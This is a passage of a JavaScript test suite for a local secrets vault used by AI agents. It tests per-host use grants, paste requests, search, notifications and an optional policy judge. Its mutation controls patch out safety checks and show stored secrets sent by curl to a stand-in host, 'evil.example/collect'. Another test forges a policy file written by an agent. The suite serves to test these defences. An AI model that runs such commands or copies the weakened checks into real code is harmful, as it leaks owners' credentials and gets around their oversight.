  const rq = w.paste.request({ caller: c, words: 'the UniFi admin password', purpose: 'log in to the UniFi gateway to read the WAN status', kind: 'password', name: LABEL, hosts: '192.168.1.1' });
  const item = (w.userTodos.snapshot().open || []).find((i) => i.action && i.action.type === P.ACTION_TYPE && i.action.requestId === rq.requestId);
  ok(rq.ok && rq.target.hosts.join() === '192.168.1.1' && item && item.action.hosts === '192.168.1.1' && item.action.grant === true, 'the request names its hosts (the item\'s action: a scalar, as every action field)', item && item.action);
  ok(item && item.detail.includes('The conversation that asked will be allowed to use it for 192.168.1.1 without asking each time; change it in the Vault window') && item.i18n.detail.some((l) => l.key === P.GRANT_LINE), 'THE CARD SAYS THE DEFAULT where the owner pastes (an i18n line)', item && item.detail);
  const an = w.paste.answer(rq.requestId, { answer: 'store', value: VALUE });
  ok(an.ok && an.outcome === 'stored' && /^secret:[0-9a-f]{10}$/.test(an.entry), 'the owner pastes ⇒ stored', an);
  const id = `secrets:${an.entry}#secret`, row = w.useGrants.rowsOf(id)[0];
  ok(row && row.to.length === 1 && row.to[0].key === 'cid-asker-1' && row.to[0].hosts.join() === '192.168.1.1' && !('until' in row.to[0]), '… and the paste WROTE the grant: the asker × 192.168.1.1 (no end)', row);
  ok(grantAudit(w).some((l) => l.door === 'vault-use' && l.resource === id && l.by === 'request'), 'through the ONE writer, by: request');
  const sn = w.vault.secretNames().find((x) => x.name === an.entry);
  ok(sn && sn.hosts.join() === '192.168.1.1' && sn.askedBy.conv === 'cid-asker-1' && sn.askedBy.name === 'Home network', 'the entry records the hosts and who asked (words — never a value)', sn);
  const rc = w.stash.filter((x) => x.cid === 'cid-asker-1').pop();
  ok(rc && /STORED/.test(rc.text) && /allowed this conversation to use it for 192\.168\.1\.1 without asking/.test(rc.text) && !rc.text.includes(VALUE), 'the agent\'s receipt says it may use it for those hosts with no card', rc && rc.text);
  const run = await runAnswered(w, CURL(`vault://secrets/${an.entry}/secret`, 'https://192.168.1.1/api/auth/login'));
  ok(run.r.ok && run.r.by === 'grant' && !run.card, '… and its first run (a cluster) asks NOTHING — the card the owner would have pressed «Always» on', { by: run.r.by, code: run.r.code });
  const d = w.paste.dropEntry(an.entry.slice(7));
  ok(d.ok && !w.useGrants.rowsOf(id).length, 'deleting the entry removes who may use it (its row)');
  w.setting['vault.requestGrantsRequester'] = false;
  const r2 = w.paste.request({ caller: c, words: 'the NAS admin password', purpose: 'read the disk health', kind: 'password', name: 'NAS admin', hosts: 'nas.lan' });
  const it2 = (w.userTodos.snapshot().open || []).find((i) => i.action && i.action.requestId === r2.requestId);
  ok(it2 && !it2.detail.includes('will be allowed') && it2.detail.includes('is not allowed to use it until you allow it') && it2.action.grant === false, 'the setting OFF ⇒ the card says the asker is NOT allowed until the owner allows it', it2 && it2.detail);
  const an2 = w.paste.answer(r2.requestId, { answer: 'store', value: VALUE });
  ok(an2.ok && !w.useGrants.rowsOf(`secrets:${an2.entry}#secret`).length && w.door._grants.size >= 1, '… the paste writes NO grant (the 8-hour run grant of before)', an2);
  w.setting['vault.requestGrantsRequester'] = true;
  const r3 = w.paste.request({ caller: c, words: 'the printer token', purpose: 'print', kind: 'secret', name: 'Printer', hosts: 'printer.lan' });
  w.setting['vault.requestGrantsRequester'] = false;
  const an3 = w.paste.answer(r3.requestId, { answer: 'store', value: VALUE });
  ok(an3.ok && !w.useGrants.rowsOf(`secrets:${an3.entry}#secret`).length, 'switched OFF between the card and the paste ⇒ read again at the paste: no grant');
  w.setting['vault.requestGrantsRequester'] = true;
  const r4 = w.paste.request({ caller: c, words: 'a key', purpose: 'build', kind: 'api-key', name: 'Build key' });
  const it4 = (w.userTodos.snapshot().open || []).find((i) => i.action && i.action.requestId === r4.requestId);
  ok(it4 && !it4.detail.includes('will be allowed') && !('hosts' in it4.action), 'a request that names NO host ⇒ no default (never «any host»)');
  const b1 = w.paste.request({ caller: c, words: 'x', purpose: 'y', kind: 'password', hosts: '*.example.com' });
  const b2 = w.paste.request({ caller: c, words: 'x', purpose: 'y', into: 'llm.apiKey', hosts: 'api.example.com' });
  ok(!b1.ok && b1.code === 'bad_host' && /never a wildcard/.test(b1.words) && !b2.ok && b2.code === 'hosts_with_into', 'a wildcard host ⇒ bad_host; --host with --into ⇒ hosts_with_into — each by name', [b1.code, b2.code]);
}

console.log('⑧ THE SEARCH — what was stored is found');
{
  const w = W4;
  const asked = w.vault.secretPut('secret:00c0ffee00', VALUE, { prov: 'owner', label: LABEL, kind: 'password', note: 'Asked for by Home network: log in', hosts: ['192.168.1.1'], askedBy: { conv: 'cid-asker-1', name: 'Home network' } });
  const L = w.contents.list();
  const row = L.rows.find((r) => r.entry === 'secret:00c0ffee00');
  ok(asked.ok && row && row.origin === 'request' && row.askedBy.name === 'Home network' && row.hosts.join() === '192.168.1.1' && VI.provenanceOf(row) === 'request' && VI.provenanceFilterOf(row) === 'me' && VI.purposeOf(row) === 'keys', 'a request-made entry: under its kind (Passwords & keys), origin «filled by you · asked for by Home network» (the 我自己 filter)', row && { origin: row.origin, askedBy: row.askedBy, hosts: row.hosts });
  const hit = (q) => VI.viewOf(L.rows, { q, purpose: 'all' }).rows.filter((r) => r.entry === 'secret:00c0ffee00').length === 1;
  ok(['Unifi', 'UNIFI', 'ucg-fiber', '192.168.1.1', 'home network', 'secret:00c0', 'password', 'Passwords & keys', 'asked for by'].every(hit), 'the owner\'s «Unifi» and every searched field: case-insensitive label, the host, the requesting conversation, the id\'s prefix, the kind, the purpose, the origin', ['Unifi', 'UNIFI', 'ucg-fiber', '192.168.1.1', 'home network', 'secret:00c0', 'password', 'Passwords & keys', 'asked for by'].filter((q) => !hit(q)));
  ok(!hit('nas') && VI.SEARCHED_FIELDS.length === 6 && VI.PROVENANCES.some((p) => p.id === 'request' && /\{who\}/.test(p.label)), 'a word it does not hold finds nothing; SEARCHED_FIELDS names what the «no match» line says');
  const use = row && row.run && row.run.use;
  ok(use && Array.isArray(use.to) && use.entryHosts.join() === '192.168.1.1', 'the row carries its «Who may use it» facts (members, the entry\'s own hosts) for the window', use);
}

console.log('⑨ THE NOTIFY — ONE coalesced vault-contents per turn of the loop, a counter only');
{
  const w = await world();
  await sleep(10);
  const f0 = contentsFrames(w).length;
  entryOf(w);
  await sleep(10);
  ok(contentsFrames(w).length === f0 + 1, 'a stored entry ⇒ ONE vault-contents broadcast');
  entryOf(w); entryOf(w); const last = entryOf(w);
  await sleep(10);
  ok(contentsFrames(w).length === f0 + 2, 'three puts in one turn of the loop ⇒ ONE more (coalesced)');
  w.vault.secretDrop(last.name);
  await sleep(10);
  const fr = contentsFrames(w);
  ok(fr.length === f0 + 3 && fr.every((m) => Object.keys(m).join() === 'type,v' && Number.isInteger(m.v)) && fr.map((m) => m.v).every((v, i, a) => !i || v > a[i - 1]), 'a delete ⇒ one more; every frame is {type, v} — a counter, never a name or a value', fr);
  ok(!JSON.stringify(w.frames).includes(VALUE) && !JSON.stringify(fr).includes(LABEL), 'no frame carries the value or the label');
}

console.log('⑩ CONTROLS — patched copies, each RED on its leg');
{
  const M = mutantCopies('vault-use-grants', REPO);
  const DSRC = fs.readFileSync(path.join(REPO, 'src/server/vault-run-door.js'), 'utf8');
  const cut = "if (!verdict.ok && verdict.ask && spec.refs.length && spec.refs.every((r) => (standing.get(r.id) || {}).ok === true)) {";
  ok(DSRC.split(cut).length === 2, 'the short-circuit line is there once (the control below patches it)');
  const noShort = M.load('src/server/vault-run-door.js', DSRC.replace(cut, 'if (false) {'), 'noshort');
  const w1 = await world({ doorMod: noShort });
  const e1 = entryOf(w1);
  w1.useGrants.addMember(e1.id, { kind: 'conversation', key: 'cid-asker-1' }, { hosts: ['192.168.1.1'] });
  const m1 = await runAnswered(w1, CURL(e1.ref, 'https://192.168.1.1/'));
  ok(m1.card && !m1.r.ok, 'MUTANT «no short-circuit» (the door as it was): the granted run DRAWS THE CARD — the shipped door runs it with none', { card: !!m1.card, code: m1.r.code });
  const USRC = fs.readFileSync(path.join(REPO, 'src/vault-use-grant.js'), 'utf8');
  const hcut = 'if (destinationKnown === true && run.length && !miss.length) return';
  ok(USRC.split(hcut).length === 2, 'the hosts rule is there once');
  const uMut = M.write('src/vault-use-grant.js', USRC.replace(hcut, 'if (destinationKnown === true && run.length) return'), 'nohosts');
  const GSRC = fs.readFileSync(path.join(REPO, 'src/server/vault-use-grants.js'), 'utf8');
  const ugMut = M.load('src/server/vault-use-grants.js', GSRC.replace("require('../vault-use-grant.js')", `require(${JSON.stringify(uMut)})`), 'nohosts-writer');
  const w2 = await world({ ugMod: ugMut });
  const e2 = entryOf(w2);
  w2.useGrants.addMember(e2.id, { kind: 'conversation', key: 'cid-asker-1' }, { hosts: ['192.168.1.1'] });
  const m2 = await runAnswered(w2, CURL(e2.ref, 'https://evil.example/collect'));
  ok(m2.r.ok && m2.r.by === 'grant' && !m2.card, 'MUTANT «a verdict that ignores the hosts»: a grant for 192.168.1.1 sends the value to evil.example with NO card — the shipped verdict draws the card (④)', { by: m2.r.by, card: !!m2.card });
  const wcut = 'if (widens(was, v.row) && !reauthed) return named(\'reveal_needs_password\');';
  ok(GSRC.split(wcut).length === 2, 'the widening rule is there once');
  const noReauth = M.load('src/server/vault-use-grants.js', GSRC.replace(wcut, ''), 'noreauth');
  const w3 = await world({ ugMod: noReauth });
  const e3 = entryOf(w3);
  const m3 = w3.useGrants.setRow(e3.id, { to: [{ kind: 'everyone', hosts: ['192.168.1.1'] }] }, { reauthed: false });
  ok(m3.ok && w3.useGrants.rowsOf(e3.id).length === 1, 'MUTANT «no 验证是你 on a widening»: a click (a header a local process can forge) gives ALL AGENTS the entry — the shipped writer refuses it (③)', m3);
  const ESRC = fs.readFileSync(path.join(REPO, 'src/server/vault-engine.js'), 'utf8');
  const ncut = "    writeAtomic(FILE, JSON.stringify(rec, null, 2) + '\\n');\n    contentsChanged('record');";
  ok(ESRC.split(ncut).length === 2, 'the record writer\'s notify is there once');
  const silent = M.load('src/server/vault-engine.js', ESRC.replace(ncut, "    writeAtomic(FILE, JSON.stringify(rec, null, 2) + '\\n');"), 'silent');
  const w4 = await world({ engineMod: silent });
  await sleep(10);
  const s0 = contentsFrames(w4).length;
  entryOf(w4);
  await sleep(10);
  ok(contentsFrames(w4).length === s0, 'MUTANT «the engine as 2.369.359 shipped it» (no notify): a stored entry broadcasts NOTHING — an open Vault window never learns it (the owner\'s «搜不到刚存的密码»); the shipped engine sends one (⑨)', contentsFrames(w4).length - s0);
}

console.log('⑪ THE POLICY JUDGE (R4, default OFF) — a stub judge, never a vendor');
{
  const DMm = require(path.join(REPO, 'src/decision-model.js'));
  const calls = [];
  let reply = () => ({ ok: true, answers: [{ name: 'within_policy', probability: 0.93 }] });
  let on = false;
  const judge = async (parts, o) => { calls.push({ parts, o }); const r = reply(); if (r instanceof Error) throw r; return r; };
  const w = await world({ judge, judgeOn: () => on });
  const e = entryOf(w, { label: LABEL });
  w.door.setRunnable({ id: e.id, on: true, reauthed: true });   // open for runs; no grant: a cluster run draws its card
  const POLICY = 'only 192.168.1.1, read-only status calls to read the WAN status';
  const p0 = w.door.setPolicy({ id: e.id, text: POLICY });
  ok(!p0.ok && p0.code === 'reveal_needs_password', 'a POLICY on a click ⇒ reveal_needs_password (it lets the judge approve uses — a widening)', p0);
  const p1 = w.door.setPolicy({ id: e.id, text: '  ' + POLICY + '\n', reauthed: true });
  ok(p1.ok && p1.policy === POLICY, 'with 验证是你: the policy (one paragraph, trimmed) is kept', p1);
  const off = await runAnswered(w, CURL(e.ref, '-sk', 'https://192.168.1.1/api/stat/health'));
  ok(off.card && !calls.length && !off.r.ok, 'the switch OFF (the default) ⇒ the judge is NEVER asked — the card, as before', { card: !!off.card, calls: calls.length });
  on = true;
  const y = await runAnswered(w, CURL(e.ref, '-sk', 'https://192.168.1.1/api/stat/health'));
  ok(y.r.ok && y.r.by === 'policy' && !y.card && calls.length === 1, 'ON + the judge says yes (0.93) ⇒ it runs with NO card — by: policy', { by: y.r.by, card: !!y.card, calls: calls.length });
  const c0 = calls[0];
  ok(c0 && Object.keys(c0.parts).join() === DMm.inputPlan('vault-use-policy').variable.map((x) => x.name).join() && c0.parts.command.includes(e.ref) && c0.parts.hosts === '192.168.1.1' && c0.parts.entry === LABEL && c0.o.policy === POLICY && c0.o.memo.id.startsWith('cid-asker-1\n') && !JSON.stringify(c0).includes(VALUE), 'the judge sees THE CARD\'S FACTS (the plan\'s parts: the command with its REFERENCE, the program, the hosts, templates, what it is for, the label) + the policy on the question — never the value', c0 && { parts: c0.parts, o: c0.o });
  const q = DMm.vaultPolicyQuestion(POLICY);
  ok(DMm.questionError(q) === null && q.type === 'predicate' && q.instructions.includes(`«${POLICY}»`) && DMm.inputPlan('vault-use-policy').wakePath === false, 'its ONE question carries the owner\'s words (a predicate, valid), off the wake path');
  const rl = linesOf(w, 'vault-run').filter((l) => l.outcome === 'ran').pop();
  ok(rl && rl.allowedBy === 'policy' && rl.policy && rl.policy.p === 0.93, 'its run line: allowedBy policy + the probability', rl && { allowedBy: rl.allowedBy, policy: rl.policy });
  const rec = (w.userTodos.snapshot().open || []).find((i) => i.action && i.action.type === 'vault-policy-approved');
  ok(rec && rec.origin === 'vault' && rec.kind === 'notice' && /a command with a stored secret was approved by the policy judge/.test(rec.text) && /^Approved by the policy judge · \d\d:\d\d · inside your policy \(0\.93\)/.test(rec.detail) && rec.action.entry === e.name && !rec.detail.includes(VALUE), 'THE RECORD where a run card\'s result is shown today (For you — the chat card chain is not on this base): «Approved by the policy judge · HH:MM · inside your policy (0.93)», its door the entry\'s row', rec && { text: rec.text, detail: rec.detail, action: rec.action });
  const f1 = w.door.rowFacts({ id: e.id, store: 'secrets', entry: e.name, field: 'secret' }).use;
  ok(f1 && f1.policy && f1.policy.text === POLICY && f1.judge === 'on' && f1.approved && f1.approved.n === 1, 'the row: the policy, the judge on, «approved 1×»', f1 && { policy: f1.policy, judge: f1.judge, approved: f1.approved });
  const cases = [
    ['a NO (0.20)', () => ({ ok: true, answers: [{ name: 'within_policy', probability: 0.2 }] }), /The policy judge did not find it inside your policy \(0\.20 < 0\.8\) — so this card asks you\./],
    ['an UNAVAILABLE judge (the plugin off)', () => ({ ok: false, why: 'plugin-off' }), /The policy judge could not be asked \(plugin-off\) — so this card asks you\./],
    ['an ERROR', () => new Error('socket hang up'), /The policy judge could not be asked \(socket hang up\) — so this card asks you\./],
    ['NO ANSWER (refused)', () => ({ ok: true, answers: [{ name: 'within_policy', refused: true }] }), /The policy judge gave no answer — so this card asks you\./],
  ];
  for (const [what, fn, re] of cases) {
    reply = fn;
    const n0 = calls.length;
    const r = await runAnswered(w, CURL(e.ref, '-s', '-X', 'POST', 'https://192.168.1.1/api/s/default/cmd/' + calls.length));
    ok(r.card && re.test(r.card.detail) && !r.r.ok && r.r.code === 'ask_denied' && calls.length === n0 + 1, `${what} ⇒ FAIL CLOSED to the card, which says the judge's answer — never a silent run`, r.card && r.card.detail.split('\n').slice(-2));
  }
  reply = () => ({ ok: true, answers: [{ name: 'within_policy', probability: 0.99 }] });
  w.useGrants.addMember(e.id, { kind: 'conversation', key: 'cid-asker-1' }, { hosts: ['192.168.1.1'] });
  const n1 = calls.length;
  const g = await runAnswered(w, CURL(e.ref, 'https://192.168.1.1/api/self'));
  ok(g.r.ok && g.r.by === 'grant' && calls.length === n1, 'a GRANT goes first: a covered run never asks the judge (by: grant)', { by: g.r.by, calls: calls.length - n1 });
  w.useGrants.revoke(e.id, 'conversation:cid-asker-1');
  const e2 = entryOf(w, { label: 'No policy here' });
  w.door.setRunnable({ id: e2.id, on: true, reauthed: true });
  const np = await runAnswered(w, CURL(e2.ref, 'https://192.168.1.1/'));
  ok(np.card && calls.length === n1, 'an entry with NO policy ⇒ the judge is never asked (the card)', calls.length - n1);
  const rv = w.door.revokeApprovals({ id: e.id });
  const recAfter = w.userTodos.get(rec.id);
  ok(rv.ok && rv.revoked === 1 && recAfter && recAfter.status !== 'open' && !w.door.rowFacts({ id: e.id, store: 'secrets', entry: e.name, field: 'secret' }).use.approved, '「Revoke」 (a click): the approved command\'s pair is revoked, its For-you record closed, the row\'s line gone', rv);
  const n2 = calls.length;
  const again = await runAnswered(w, CURL(e.ref, '-sk', 'https://192.168.1.1/api/stat/health'));
  ok(again.card && calls.length === n2 && again.card.detail.includes('You revoked the policy judge\'s approval of this command — so this card asks you.'), '… the same command next time: the card (saying it was revoked) — the judge NOT asked', { calls: calls.length - n2, tail: again.card && again.card.detail.split('\n').slice(-1) });
  const d2 = w.mk();
  const f2 = d2.rowFacts({ id: e.id, store: 'secrets', entry: e.name, field: 'secret' });
  const st = JSON.parse(fs.readFileSync(path.join(w.dataDir, DOOR.STORE_FILE), 'utf8'));
  ok(f2.open === true && f2.use.policy && f2.use.policy.text === POLICY && st.policies && st.policies[e.id].text === POLICY && Array.isArray(st.policyRevoked) && st.policyRevoked.length === 1, 'the policy and the revocation PERSIST in the marked store (a new door reads them back — a restart)');
  const cl = w.door.setPolicy({ id: e.id, text: '' });
  ok(cl.ok && cl.policy === null && !JSON.parse(fs.readFileSync(path.join(w.dataDir, DOOR.STORE_FILE), 'utf8')).policies, 'clearing the policy is a click; the store keeps none (the body as 2.369.359 wrote it)');
  // a FORGED store: an agent (the same uid) writes a policy into the file — its mark does not verify ⇒ read as empty, nothing judged
  const w3 = await world({ judge, judgeOn: () => true });
  const e3 = entryOf(w3);
  fs.writeFileSync(path.join(w3.dataDir, DOOR.STORE_FILE), JSON.stringify({ v: 1, gen: 3, runnable: [e3.id], always: [], policies: { [e3.id]: { text: 'anything goes', at: 1, by: 'agent' } }, mark: 'a'.repeat(64) }));
  const d3 = w3.mk();
  const f3 = d3.rowFacts({ id: e3.id, store: 'secrets', entry: e3.name, field: 'secret' });
  ok(f3.open === false && !(f3.use && f3.use.policy), 'a FORGED policy (an unmarked store) is read as nothing: the entry closed, no policy, the judge never reached');
  // a 2.369.359 body (no policies key) still verifies — the upgrade keeps the switches
  const w4 = await world();
  const e4 = entryOf(w4);
  const body4 = JSON.stringify({ v: 1, gen: 2, runnable: [e4.id], always: [] });
  fs.writeFileSync(path.join(w4.dataDir, DOOR.STORE_FILE), JSON.stringify({ ...JSON.parse(body4), mark: w4.vault.macOf(DOOR.MARK_LABEL, body4) }));
  ok(w4.mk().rowFacts({ id: e4.id, store: 'secrets', entry: e4.name, field: 'secret' }).open === true, 'a 2.369.359 store body (no policies) still VERIFIES — the switch stays on after the upgrade');
  // CONTROL: a door that runs on the judge's NO
  const M2 = mutantCopies('vault-use-grants-r4', REPO);
  const DS = fs.readFileSync(path.join(REPO, 'src/server/vault-run-door.js'), 'utf8');
  const cut = 'if (j.approve) { verdict = { ok: true, by: \'policy\', p: j.p };';
  ok(DS.split(cut).length === 2, 'the judge\'s approval line is there once');
  const lax = M2.load('src/server/vault-run-door.js', DS.replace(cut, 'if (true) { verdict = { ok: true, by: \'policy\', p: j.p || 0 };'), 'lax');
  const w5 = await world({ doorMod: lax, judge: async () => ({ ok: false, why: 'plugin-off' }), judgeOn: () => true });
  const e5 = entryOf(w5);
  w5.door.setRunnable({ id: e5.id, on: true, reauthed: true });
  w5.door.setPolicy({ id: e5.id, text: POLICY, reauthed: true });
  const m5 = await runAnswered(w5, CURL(e5.ref, 'https://evil.example/collect'));
  ok(m5.r.ok && !m5.card, 'MUTANT «run on anything the judge says»: an UNAVAILABLE judge sends the value to evil.example with no card — the shipped door draws the card (fail closed)', { ok: m5.r.ok, card: !!m5.card });
}

console.log(fail ? `\n${pass} passed, ${fail} failed` : `\nALL PASS (${pass})`);
process.exit(fail ? 1 : 0);
